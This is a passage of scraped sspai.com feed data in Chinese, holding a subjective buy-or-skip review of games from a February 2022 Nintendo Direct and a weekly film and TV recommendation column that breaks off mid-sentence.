作为主机与掌机跨界产品的本质似乎注定了其「冷饭之王」的命运，本场直面会上当然也少不了独占新作与移植作品扎堆出现的传统艺能。但无论热饭冷饭，好吃的饭才是好饭——因此，本文挑选了一些本场直面会上值得「追根溯源」的游戏作品，并从 NS 平台的游戏体验入手，为各位少数派带来一份详尽的「种 / 拔草」参考建议。</p>\n<p><strong>注：本文内容具有时效性，部分内容带有主观色彩，实际游戏表现请以正式发售版本为准，游戏截图来自机核。</strong></p>\n<h2>火焰之纹章 无双 风花雪月</h2>\n<blockquote><p>做完火纹做塞尔达，做完塞尔达做火纹，脸都不要了。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/10/ac80b3eec2b776462e3ed11722c1295c.JPEG\"></figure><p>由光荣操刀的《火焰之纹章 无双 风花雪月》是本次直面会开场展示的第一个游戏，将于 6 月 24 日正式发布。从预告片可以看出，本作走的依然是经典 IP + 无双玩法，并融合原作剧情架构和部分系统设定的老路数。光荣打磨了十几年的玩法套路自然不必多言，稍有动作游戏经验的玩家都能很快上手；鉴于任天堂和光荣已经不是第一次在 NS 平台上合作推出此类游戏，参考前作《火焰纹章 无双》以及两部《塞尔达无双》的画面和帧数表现，本作的优化问题也不必过多担心。</p>\n<p>对于已经极尽成熟无双类游戏而言，其面临的最大困境在于如何在千篇一律的「刷刷刷」之中找到爽快感和趣味性的平衡，但光荣似乎始终未在此方面取得许多具有突破性的成效，反而是各种经典 IP 的授权反过来占据上风，成为了光荣躺平吸金的主要手段。就目前可以获知的信息来看，《火焰之纹章 无双 风花雪月》的游戏素质显然远超及格线之上，不过其出现似乎也只是让 NS 平台上可以玩到的无双游戏中又多了一个选择，仅此而已。</p>\n<h2>高级战争 1+2 重制版</h2>\n<blockquote><p>战棋入门新选择。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/0855d4adf4062b120a41e6fef240a7c3.JPEG\"></figure><p>《高级战争》系列是 GBA 平台上的知名战棋游戏，本作是 GBA 上两作《高级战争》的重制版，在保留原作基本设定的基础上全面革新画面、加入角色配音、新增了完善的地图编辑器和多人对战等新玩法，可玩性更上一层楼。相对于同类游戏，本作没有复杂的收集和培养要素，更加重视战术的运用，游戏节奏倾向于「短平快」式处理，非常适合新手玩家入门；清新的画风、简单的系统和高度的策略性都让本作具备了一款「杀时间」作品的必备要素，即快上手、慢精通、易沉迷，简称「很上头」。</p>\n<h2>无人深空</h2>\n<blockquote><p>知错能改，善莫大焉。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/10/77a796c9426d15ff4f53993870ac3b4f.JPEG\"></figure><p>从《无人深空》到「无人深坑」再到「有人深空」，《无人深空》在发售初期遭受的挫败在于制作组在宣发上将一款独立游戏给捧到了超越当今大多数开放世界大作的水准，好在这种内容与包装明显不符的「方便面」行为没有以悲剧收场，制作组至今依然在勤勤恳恳的通过更新扩充游戏内容，他们不但试图兑现自己当初承诺的结果，并且在此过程中不断激发游戏本身蕴含的无限可能。</p>\n<p>本作登陆 NS 平台的主要压力来自优化——制作组要解决的不仅是通过即时演算生成无数颗各不相同且可供探索的星球，还要解决掌机模式下的操作模式和用户界面易用性等一系列复杂程度不一而又在游戏体验上相互关联的问题——最重要的是，这一次的《无人深空》绝不能重蹈覆辙，以大大小小的更新补丁缓慢的解决问题绝非长久之计。</p>\n<p>说到底，《无人深空》之于 NS 平台的意义还是开创了太空探索游戏这一新的品类。目前 NS 平台并没有一款有足够体量的游戏能够与本作在玩法上直接形成竞争关系，如果本作能够在完整移植 PC 端内容的前提下保证流畅稳定的运行效果和至少不反人类的操作方式，那么还是非常可堪一玩的。</p>\n<h2>马力欧足球 战斗联盟（暂译）</h2>\n<blockquote><p>《少林足球》任天堂分球。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/10/de17133351ccb7c73d14a2fd82fa3553.JPEG\"></figure><p>《马力欧足球》的初代作品于 2005 年 11 月 18 日登陆于任天堂 NGC 主机，其续作《马力欧足球：激情四射》则于 2007 年 7 月 30 日登陆 Wii 平台。不同于传统的欧美「车枪球」，本系列作品秉承了任天堂的一贯风格，以轻松的上手体验和紧凑的游戏节奏著称。从预告片里浮夸的角色动作和必杀技一般的「超级射门」等画面中可以看出，本作也是一款大量融合了动作游戏元素的足球游戏——与其说是能打架的足球，不如说是带球开战的大乱斗来的更加合理。</p>\n<p>前两作的《马力欧足球》的媒体评分和销量都不算差，初代作品更是一举斩获了 2005 年 E3 游戏展「最佳体育游戏」的奖项以及「最佳游戏」的提名。然而作为马力欧的众多外传性质作品，《马力欧足球》系列却远没有同为体育游戏的《马力欧赛车》和《马力欧网球》系列那样经久不衰。究其原因，该系列在游戏设计上已经基本脱离了足球游戏的框架，但依然遵循球类游戏的基本得分规则，对休闲玩家和专业玩家都缺乏持续的吸引力。</p>\n<p>从预告片内容和《马力欧足球：战斗联盟》这个名字来看，本作似乎特意强调了游戏的动作要素，力道十足的打击感、场景杀、道具杀和种类繁多的角色 / 技能搭配具有相当的可玩性，最多支持八人对战的联机模式也让游戏的耐玩程度获得了极大的提升。时隔多年，这部打破常规的马力欧系列作品或许能够带给玩家完全不同的体验。</p>\n<h2>斯普拉遁 3</h2>\n<blockquote><p>你熟悉的喷墨鱿鱼又回来了。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/10/29fcad6a77753626e793ba9fb87f8fea.JPEG\"></figure><p>《斯普拉遁》系列是 NS 平台第三人称射击游戏的头牌，除此之外很难找到任何一款能够在创意程度和玩法设计上与其相提并论的作品。作为 2015 年 5 月 28 日问世的任天堂第一方游戏系列，《斯普拉遁》与其他大作比起来的确相当年轻，这种年轻也体现在了作品本身偏向「潮流化」的游玩体验和包装设计上。</p>\n<p>本场直面会上公布的《斯普拉遁 3》加入了新的多人 PvE 内容「打工模式」，以及将会在新模式中出现的多个 Boss 形象，对 PvP 竞技相对苦手的玩家也能找到属于自己的乐趣并提升自己的实力。与前作相比，本作的门槛更低，上手更快，游戏环境更友好，于新老玩家而言都是值得入手的佳作。</p>\n<h2>前线任务 1st 重制版</h2>\n<blockquote><p>让 SRPG 游戏再次伟大。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/10/d0b9f84e6064f8bdb2c6af746193f5f0.JPEG\"></figure><p>《前线任务》这个名字听起来总有些恍如隔世的感觉，毕竟 SE 社的这一知名策略角色扮演游戏早在 1995 年就已经登陆了 SFC 平台，虽然系列游戏的 IP 一直延续至今，但其最新作品《前线任务：进化》的发售也已经是十多年前的事情，年代实在是过于久远了。</p>\n<p>本作是系列初代作品的高清重制，SE 社的诚意在于本作并非是单纯提高画面分辨率的所谓重制版，而是在保留原作框架和设定的基础上对画面和系统的完全革新。虽然受制于 NS 的机能限制，但预告片中演示的画面表现依然处于当代玩家可以接受的范围之内，战斗画面的细节表现可圈可点，甚至算得上是同类型游戏的翘楚。</p>\n<p>策略角色扮演游戏作为一个类目呈现整体衰落之势，其核心问题在于传统 RPG 形式的剧情走向和角色培养与偏向 1V1 的战斗模式在发展过程中逐渐被表现手法更加直接的即时战斗所取代，导致此类游戏在上手难度偏高的同时又很难给到玩家足够的代入感和成就感。希望本作能够在游戏系统上解决这一大痛点，毕竟原作的剧情和玩法已经相当优秀，相信在重制版的加持下能够得到更加惊艳的演出效果和更加舒适的游玩体验。</p>\n<h2>SD 高达 战斗同盟（暂译）</h2>\n<blockquote><p>我将以高达形态出击。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/10/506fb8b7ab7b540b522c8c8b86c4d8ab.JPEG\"></figure><p>《机动战士高达》系列是万代南梦宫旗下吸金能力最强的 IP 之一，其在 ACG 领域的生命周期之长、衍生作品数量之多都达到了令人瞠目结舌的地步。在游戏领域，以《机动战士高达》为主题的动作游戏和战棋游戏以独特的玩法和令收集向玩家狂喜的图鉴数量独领风骚。虽然 NS 平台上有《SD 高达 G 世纪 火线纵横》这样的战棋游戏，却一直没有一款能让玩家「以高达形态出击」的动作游戏登陆，而这个问题很难用所谓「机能限制」的借口搪塞过去——要知道，在更加陈旧的 PSP 平台上都能玩到《高达 VS 高达》、《高达战争》和《高达生存突击》等王牌动作游戏，甚至在性能差到不忍直视的 DS 平台上也有《机动战士高达 00》——说到底，还是万代南梦宫的态度问题。</p>\n<p>终于，在 NS 面世的第五个年头，《SD 高达 战斗同盟》姗姗来迟。尽管参战机体都是以三头身比例的 SD Rank 呈现，但从预告片中放出的 PvE 和 PvP 演示画面中可以看出本作的游戏性并未因此缩水，机体的收集和培养系统也没有缺席，总算补全了 NS 平台上高达游戏的一大空白。不难预见到本作在很长一段时间里都是 NS 平台上高达动作游戏的唯一选择，万代南梦宫也会在后续更新的一系列 DLC 中不断推出新的机体，结合日厂游戏的一贯调性，这款游戏的完整版价格一定不低，加上此类游戏的操作偏难，熟练度要求较高，是 NS 游戏中「又肝又氪」的典型，高达系列粉丝之外的玩家在入手之前还是要仔细考量清楚的。</p>\n<h2>时空之旅 重制版</h2>\n<blockquote><p>《时空之轮》的冷饭炒够了，也该炒炒续作了。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/884950986cdb6083db419c0142f2c05b.JPEG\"></figure><p>《时空之旅》是 SFC 著名角色扮演游戏《时空之轮》名义上的续作，二者在画面和玩法上高度相似，剧情设定却相互独立，这是因为前作《时空之轮》是由 SE 社前身之一的史克威尔独立开发的作品，而《时空之旅》则是 SE 社成立之后由史克威尔和艾尼克斯两家合作完成的。《时空之轮》号称由操刀了《最终幻想》的坂口博信担任导演，《勇者斗恶龙》的剧本负责人掘井雄二作为编剧，漫画大师鸟山明进行角色设计，虽然这三位 ACG 领域的泰斗级人物并未像宣发中所说的一样全程参与游戏的开发工作，但是《时空之轮》依然成为了 RPG 黄金年代的殿堂级作品，甚至在 2017 年重登 IGN 的世界 RPG 游戏排行榜榜首。</p>\n<p>在二十多年的漫长时间里，《时空之旅》一直存活在前作的「神作」光环之下，SE 社揪着《时空之轮》的名头往死里薅羊毛，接连推出了 PS 版、DS 版、PC 版、Android 版、iOS 版等「原汁原味」的复刻版在全世界范围内捞钱，甚至将移动端的复刻版连 UI 都不改的搬上 Steam 狠赚一波，被义愤填膺的玩家们喷了个狗血淋头。终于，SE 社想起了自己手里还有个名叫《时空之旅》的所谓续作，这也就是本作登陆 NS 平台的原因之一。从预告片来看，本作只是将原作简单移植到 NS 平台的复刻版，《时空之轮》和《时空之旅》确实是角色扮演游戏的里程碑级作品，但为此入手这种毫无诚意的「重制作品」还是大可不必了。</p>\n<h2>星之卡比 探索发现</h2>\n<blockquote><p>粉色恶魔的奥德赛。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/640e21447be6574dd88b2018a1584c95.JPEG\"></figure><p>作为任天堂旗下的 IP，《星之卡比》系列作品在社内长期处于二线地位，虽然这只玩家们非常熟悉的「粉色恶魔」拥有以「吸收」为核心的独特玩法机制，但其推出的大多数游戏作品在核心体验上都更像是《超级马力欧》等一线 IP 的「青春版」，这些游戏作品足够有趣，但没有形成独立的风格——从这一点看来，本作似乎也不例外。</p>\n<p>《星之卡比 探索发现》主打的玩法是让卡比在一个个箱庭世界中通过探索场景和吸收道具让自身具备不同的物品属性，从而利用这些属性进行解谜和战斗来推进游戏进程，和《超级马力欧 奥德赛》的附身系统有着异曲同工之处。不过本作毕竟属于二线 IP，在可玩性和收集要素上可能会打个折扣，喜欢《超级马力欧 奥德赛》的玩家上手本作应该不会感到陌生，但是否值得为此花费一张任亏券还是一个非常现实的问题。</p>\n<h2>总结</h2>\n<p>诚然，还有很多在本场直面会上公开的游戏没有被本文提及，这些作品或是可公开的情报太少，难以得出有参考性的建议；或是早已被玩家所熟知，实在没有必要重新捡起来评价一番。NS 的性能羸弱是不争的事实，虽然任天堂的作品一贯以「游戏性」著称，但 NS 早已不是一家独大的平台；除去某些游戏厂商的主动「摆烂」之外，越发泛滥的「炒冷饭」现象本就是硬件制约软件的必然结果。从 2017 到 2022，虽然 NS 取得了巨大的成功，但是一个能够承载更多新作、第一方和第三方共同发展的平台更加符合玩家对未来游戏行业发展趋势的期望。传说中的 NS Pro 依然遥遥无期，我们也只能寄希望于任天堂在次世代机型作出更多的改变。</p>\n<p>关联阅读：<a href=\"https://sspai.com/post/71352\" target=\"_blank\">《异度神剑 3》正式公布！任天堂直面会消息汇总</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更新更好玩的游戏资讯 🎮</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71354"},{"title":"本周看什么丨最近值得一看的 6 部作品","date":"2022-02-11 09:48:11","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[意大利] 我的天才女友 第三季、[电影] 一个英雄、[纪录片] 逃亡、[美剧] 帕姆与汤米、[动画] 幻灭 第四季、[美剧] 侠探杰克</li>\n<li>几则精彩预告：《侏罗纪世界 3》首曝预告，6 月 10 日北美上映、皮克斯新作《光年正传》公布新预告，6 月 17 日上映、《了不起的麦瑟尔夫人》第四季发布正式预告，2 月 18 日开播、程耳执导、梁朝伟主演新片《无名》首爆预告</li>\n<li>几则影视资讯：陈哲艺执导新片《燃冬》官宣主演阵容、Hulu 宣布续订经典动画《飞出个未来》，2023 年上线、Disney+ 新剧《欧比旺》首曝海报、冰墩墩、雪容融「参演」的动画电影《我们的冬奥》发布新海报</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[意大利] 我的天才女友 第三季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/ffadcc94f5fb07113ffb4f2b4cbc4bd8.png\"></figure><p>关键词：剧情</p>\n<p>时长：45-50 分钟左右（单集）× 8 集；<a href=\"https://movie.douban.com/subject/35051880/\">豆瓣链接</a></p>\n<blockquote><p>我把过去删除了，过去也把我删除了。</p></blockquote>\n<p>@潘誉晗 ：HBO 神剧《我的天才女友》第三季在万众期待下在 RaiPlay 提前开播，真是欧美圈开年一场突如其来的惊喜。这一季的内容根据「那不勒斯四部曲」第三部《离开的，留下的》改编，制作水准依然保持前两季的高质量，也获得了观众的一致好评。</p>\n<p>在这一季内容的时间线为 1970 年，一个充满无限挑战和希望，但是又有着许多不确定性的时代。莉拉的早婚早孕并没有带给她安定平稳的生活，离婚之后的她在那不勒斯郊区的一家工厂工作，虽然看似独立，但是条件却非常辛苦。大学毕业的埃莱娜成功出版了属于自己的第一部小说，恶评好评都有，可也因此让她走进了一个自己从没有经历过的世界。</p>\n<p>两个一起长大的姑娘似乎在这一刻面对着不同的命运，可令人遗憾的是，两个在各自命运途中奋斗的姑娘在生活中遇到的困境本质上是一样的。逃离了渣男丈夫的莉拉为了生存被男同事轻视甚至骚扰，看似成功的埃莱娜却因为小说仅仅几页的情欲描写被冠上了「荡妇」的标签。终于摆脱了原生家庭的她们明明那样认真努力，阶级和社会却偏偏对她们如此残忍。好在生活很苦，这两位优秀美丽的女性却一直没有放弃，真是令人佩服。</p>\n<h3>[电影] 一个英雄</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/6dfa29d6f71163e24b3185ebb5f8ec0b.png\"></figure><p>关键词：伊朗 / 剧情</p>\n<p>片长：127 分钟；<a href=\"https://movie.douban.com/subject/34966906/\">豆瓣链接</a></p>\n<blockquote><p>冷静克制的法哈蒂式叙事。</p></blockquote>\n<p>@甜約翰：电影的主人公拉希姆因无力偿还债务而入狱，在两天的假释期中，他的女友意外捡到一个装着金币的手提包，拉希姆原本打算卖掉金币，却因金额远远不够用来还债只好作罢。于是他四处张贴告示，想要把金币物归原主，令人意想不到的是，拉希姆因拾金不昧一夜之间在媒体上走红，并成为了大家眼中的「英雄」，就在生活即将迎来转变的时候，意想不到的事情又发生了……</p>\n<p>如同《一次别离》和《推销员》一样，导演阿斯哈·法哈蒂依旧聚焦伊朗社会，冷静观察现代社会人与人之间的关系。影片以工整的剧作结构，精准的伏笔设置，内敛的情感表达，以及极具个人风格的叙事手法，讲述了一个关于金钱、关乎声誉的故事。一个被奉为英雄却又深陷双重困境（其一是道德困境，其二是生活困境）的欠债者，一群不关心事实唯流量至上的媒体，影片于亦虚亦实间完成了对社会制度、媒体跟风、虚假慈善、官僚主义的批判与思考，颇具启示意义，而面对一次又一次的舆论事件，身处流量时代的我们，又该怎么做呢？</p>\n<h3>[纪录片] 逃亡</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/de5e6e623a2694c4754fcc4fbee6e04b.png\"></figure><p>关键词：动画 / 传记</p>\n<p>片长：88 分钟</p>\n<p>观看渠道：<a href=\"https://www.hulu.com/movie/flee-dbaf52c6-6944-442c-8064-863ef948200a\" target=\"_blank\">Hulu</a>；<a href=\"https://movie.douban.com/subject/30403645/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>家是你可以一直停留，不必担心被迫离开的地方。</p></blockquote>\n<p>@SHY：去年年中开始的一系列大新闻，让命途多舛的阿富汗再度暴露在聚光灯下。喀布尔机场周围，为逃离塔利班统治而背井离乡的普通民众牵动着世人的心。在此之前数个月，一部历时七年拍摄，关于阿富汗难民的纪录片《逃亡》已在圣丹斯电影节首映，并荣获世界纪录片单元评审团大奖。但它讲的并非那些已被重复无数遍的难民故事，亦未堆砌抽象而冰冷的宏大命题，只是一位普通人 Amin 向好友口述的真实经历。</p>\n<p>如今，Amin 已在丹麦落地生根，工作学习均步入正轨，还与同性伴侣成婚，生活看似幸福美满。然而，源自童年时代的恐惧却刻入了他的灵魂，曾经美丽的家乡被战火摧毁，与父亲失去联络，随家人逃至莫斯科，非法滞留，偷渡被捕，目睹旁人被性侵却无力阻止，历经千辛万苦才抵达哥本哈根。为了生存，他只得谎称亲友全部身亡，多年来将秘密深藏心间，曾向前男友倾诉后却反被对方威胁。颠沛流离的日子重塑了 Amin 的人格，难民与同性恋的双重身份让他自我压抑，无法找到归宿。</p>\n<p>在《逃亡》中，Amin 第一次敞开心扉，诉说自己的过去。为了保护隐私，除了采用化名外，导演乔纳斯·波赫·拉斯穆森还别出心裁地选择了动画形式。片中出现的受访场景均为实际发生，却以动画呈现，这并未削弱影片叙事的力量，还赋予其更高的自由度。Amin 记忆中的悲惨片段以黑白色调的炭笔勾勒，线条时而疏离，时而爆发，穿插史书中的真实影像，模糊现实与虚幻的界限，却更能令观众感同身受。细致入微，以小见大，处处流露着真情与关怀，无怪乎本作能一路拿下多个重磅奖项，更斩获三项奥斯卡提名了。</p>\n<h3>[美剧] 帕姆与汤米</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/f58738f57d04e6fd71eec06dbf81981e.png\"></figure><p>关键词：剧情 / 爱情 / 传记</p>\n<p>时长：45 分钟左右（单集）× 8 集；<a href=\"https://movie.douban.com/subject/35408024/\">豆瓣链接</a></p>\n<blockquote><p>明明都是受害者，为何女性却遭受更多的微词和指责？</p></blockquote>\n<p>@潘誉晗 ：虽然才播出一周，可《帕姆与汤米》还是凭借剧情的精彩空降至 Disney+ 全球热度榜第十的好成绩。这部根据真人真事改编的剧集，不光在烂番茄获得了 86% 的新鲜度，更是获得了影评人的一致推荐。</p>\n<p>演员帕姆·安德森和摇滚乐手汤米·李闪电结婚，在蜜月无比享受甜蜜的爱情，可当他们的亲密录音带被偷窃并公开之后，所带来的性丑闻给他们的生活造成了巨大影响。</p>\n<p>莉莉·詹姆斯和塞巴斯蒂安·斯坦突破以往的造型之后，似乎有一种豁出去的感觉。汤米和「小汤米」神神叨叨的对话，把摇滚歌手的疯狂个性表露无遗。一改甜妹路线的莉莉也令人惊喜，把饰演角色的性感与风情表现得很棒。而更值得引起我们反思的，是隐藏在事件背后被忽略的性别上的差别对待——明明都是受害者，都是隐私权被侵害，可为什么作为女性的帕姆要遭受更多的嘲讽和指责？当汤米甚至因为这件事情受到支持声和财富的时候，帕姆就需要在节目上面对主持人的无理提问，然后还要假装微笑吗？两性问题本就不应该被如此双标对待。</p>\n<h3>[动画] 幻灭 第四季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/a263434986489028e83d2f8b5a7bac4f.png\"></figure><p>关键词：奇幻 / 冒险 / 喜剧</p>\n<p>片长：约 30 分钟（单集）× 10 集</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/80095697\" target=\"_blank\">Netflix</a>；<a href=\"https://movie.douban.com/subject/35068571/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>人类喜欢比喻，因为他们不敢直言内心的想法。</p></blockquote>\n<p>@SHY：欢迎回到梦之国，承接上一季结局，小碧公主被生母达歌玛带往地狱，准备与撒旦完婚；艾弗试图摆脱食人魔，却意外发现了自己曲折身世的秘密；路西则不幸成为第一位升上天堂的恶魔，必须设法从上帝眼皮底下开溜。这三位无法无天的小伙伴能否蒙混过关，再度聚首，继续惹是生非呢？当然，不要忘记被送进疯人院的国王索格，当上了海贼女王的继母乌娜，蒸汽国的科儿学大亨艾尔瓦，与森林为伴的人熊厄苏拉，以及燃烧过一夜姬情的人鱼莫拉。</p>\n<p>除了这些我们熟悉的角色，在第四季中，不少只露过一两次面的人物也捞到了出场机会。各路势力纷至沓来，牵出一众伏线，从蒸汽国的动力来源一路奔向梦之国的黑暗历史，精灵与矮怪们的纠葛同样值得留意。策划千年的阴谋诡计背后，更少不了一地鸡飞狗跳，一边对付又一场政变，一边还要直面比自己更坏更强更聪明的梦中二重身，小碧眼前的麻烦实在多得数不过来，而达歌玛的真正目的才刚要浮出水面。</p>\n<p>现在回首《幻灭》第一季开头，已显得物是人非，故事的舞台天翻地覆，不变的是荒诞中透着哲理的奇思妙想<s>和挖坑不填的光荣传统</s>。铺垫完成之后，前期的诸多无厘头展开都发挥了各自的作用，世界观设定逐步揭晓，故事层层反转，登场角色越来越多，却丝毫不显得凌乱，编剧的功力可见一斑。又一轮悲欢离合落幕，众人走向不可预知的未来，期待第五季为我们带来新的惊喜。</p>\n<h3>[美剧] 侠探杰克</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/57165206d15da3695d3ea9e9dadad01d.png\"></figure><p>关键词：动作</p>\n<p>时长：45 分钟左右（单集）× 8 集；<a href=\"https://movie.douban.com/subject/30378897/\">豆瓣链接</a></p>\n<blockquote><p>这位壮士不讲武德，打架前的数数不按照以往的江湖规矩～</p></blockquote>\n<p>@潘誉晗 ：雷彻·杰克乔生活在治亚州一个只有一千多人口的小镇，这天他只是想安安稳稳喝杯咖啡、吃个桃子派，却被意外卷入了小镇的无情杀戮。更令他感到愤怒的，不是被大家误认成凶手，也不是探长利用他的断案能力走捷径，而是第一桩案件的死者，是他多年未见的哥哥。</p>\n<p>虽然十年前就有阿汤哥版根据李·查尔德「浪子神探」系列改编的同名电影，可他的小个子还是少了原著那种硬汉的味道。而亚马逊的剧集版则成功太多，不光荣登「烂番茄」近期最受关注剧集榜首，并且以高收视成功续订了第二季。</p>\n<p>饰演男主的阿兰·里奇森身型高大，与原著相近的设定让人惊喜，那副看上去就很能打的块头，压迫感十足。剧中的几场打戏也干净利索，智商在线的杰克不打嘴炮不多说话，既然是敌对方，先打就对了。与杰克搭档的无论是女警察还是黑人警探，也都是不拖后退的队友，尤其是女主，也不是为了增加感情线的花瓶而已。干练聪慧的女警察发现自己被针对脾气瞬间爆发，这种小辣椒脾气可太讨喜了。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/34990945/\">[英剧] 怀疑</a> @潘誉晗 ：富商儿子在纽约的一家酒店被绑，四位嫌疑人把绑架的过程制作成搞笑影片放在了网络上。而英国四位毫不相干的人，成为了警察怀疑的对象。APPLE TV 这一次改编自以色列剧集的新剧聚集了不少观众们熟悉的老熟人，除了《生活大爆炸》的 Raj、《神盾局特工》的 Simmons、《黑镜》里的 Amy，Uma 的加入也令人惊喜不已，可追。</p>\n<p><a href=\"https://movie.douban.com/subject/35061444/\">[英剧] 一触即发</a><strong> </strong>@潘誉晗 ：以伦敦警察厅拆弹小组作为故事主线的反恐刑侦剧，毕竟都用上了炸弹这样杀伤威力强大的武器，所以剧集是正统严肃的悬疑剧类型，拆弹时那种紧张的氛围也营造得很不错。就是第一集做铺垫炸弹炸得迟，在你意想不到的时候突然炸了，还是在内心感受到了一次「卧槽」的心情。</p>\n<p><a href=\"https://movie.douban.com/subject/35745648/\">[综艺] 圆桌新春派</a> @甜約翰：《圆桌派》番外节目《圆桌新春派》于春节前夕上线 <a href=\"https://v.youku.com/v_show/id_XNTIwNDIyNzc5Ng==.html?spm=a2h0c.8166622.PhoneSokuProgram_1.dselectbutton_1&amp;showid=fddc3684151248fd96ca\">优酷视频</a>。该节目共两集，分别以「元宇宙」和「家宴」为主题，主持人窦文涛与嘉宾（尹烨、郝景芳、段永朝、陈立、陈晓卿、陈晓楠）围坐圆桌侃侃而谈，一样的「神仙打架」，不同的思想碰撞，感兴趣的朋友可以一看。</p>\n<h2>📅 本周新预告</h2>\n<h3>《侏罗纪世界 3》首曝预告，6 月 10 日北美上映</h3> <p>2 月 10 日，科幻大片《侏罗纪世界 3》发布预告，影片由科林·特雷沃罗执导，克里斯·帕拉特和布莱丝·达拉斯·霍华德、山姆·尼尔、劳拉·邓恩、杰夫·高布伦等出演。讲述侏罗纪公园不复存在后，恐龙进入人类世界的故事，6 月 10 日北美上映。</p>\n<h3>皮克斯新作《光年正传》公布新预告，6 月 17 日上映</h3> <p>皮克斯公布了动画电影《光年正传》的新预告，由安格斯·麦克连执导，皮特·多克特编剧，「美国队长」克里斯·埃文斯等配音，定于 2022 年 6 月 17 日全球上映。本作系《玩具总动员》衍生电影，以第二位登上月球的宇航员巴兹·奥尔德林为蓝本，讲述玩具巴斯光年从年轻试飞员变身太空游侠的起源故事。</p>\n<h3>《了不起的麦瑟尔夫人》第四季发布正式预告，2 月 18 日开播</h3> <p>2 月 8 日，《了不起的麦瑟尔夫人》第四季发布正式预告。本季由瑞秋·布罗斯纳安、托尼·夏尔赫布、艾利克斯·布诺斯町等回归出演，里德·斯科特、戈登·格里克新晋加盟。本季共 8 集，将于 2 月 18 日开播。</p>\n<h3>程耳执导、梁朝伟主演新片《无名》首爆预告</h3> <p>2 月 9 日，由程耳自编自导，梁朝伟、王一博、王传君等主演的电影《无名》发布首支预告。该片是继《中国医生》《长津湖》后，博纳影业「中国胜利三部曲」的第三部作品，预计今年年内上映。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1E5411o7UF\" target=\"_blank\"><strong>《暗黑破坏神》新作动画公布先导预告，2022 年上线 Netflix：</strong></a>漫改动画剧集《BASTARD!! 暗黑破坏神》公布了首支先导预告，尾崎隆晴执导，黑田洋介系构，LIDENFILMS 制作，第一季共 24 集，2022 年内上线 Netflix。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1F34y1C7B7?spm_id_from=333.999.0.0\" target=\"_blank\"><strong>阿曼达·塞弗里德主演新剧《辍学生》首曝预告，3 月 3 日开播：</strong></a>阿曼达·塞弗里德主演的 Hulu 限定剧《辍学生》发布预告，将于 3 月 3 日开播。该剧根据 ABC Radio 同名播客改编，由迈克尔·肖沃特执导。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1QY41147Wp\" target=\"_blank\"><strong>开心麻花科幻喜剧《独行月球》首曝预告，将于年内上映：</strong></a>由张吃鱼执导，沈腾、马丽主演开心麻花科幻喜剧电影《独行月球》发布预告，讲述 2033 年，为了抵御小行星的撞击，拯救地球，人类在月球部署了月盾计划。全员撤离时，维修工独孤月（沈腾 饰）被领队马蓝星（马丽 饰）落在了月球后的故事，将于 2022 年上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV173411J7xk?spm_id_from=333.999.0.0\" target=\"_blank\"><strong>林嘉欣主演电影《美国女孩》3 月 2 日上线 Netflix</strong></a><strong>：</strong>2 月 7 日，改编自真实事件，由阮凤仪执导，林嘉欣、庄凯勋、方郁婷主演的电影《美国女孩》发布正式预告。该片以亲情、女性成长、身份认同为主题，将于 3 月 2 日上线 Netflix。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Yb4y177oF?spm_id_from=333.999.0.0\" target=\"_blank\"><strong>《华灯初上》第三季 3 月 18 日上线 Netflix：</strong></a>2 月 9 日，《华灯初上》第三季发布正式预告，将于 3 月 18 日上线 Netflix。该剧由林心如担任监制并主演，连奕琦执导，演员阵容还包括杨祐宁、杨谨华、 凤小岳、修杰楷、张轩睿、郭雪芙、谢欣颖、刘品言 、吴慷仁、霍建华等。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1SS4y1k7sT?spm_id_from=333.999.0.0\" target=\"_blank\"><strong>Netflix 发布 2022 年新片混剪预告</strong></a><strong>：</strong>2 月 3 日，Netflix 发布 2022 年电影项目先导预告。《灰色人》《利刃出鞘 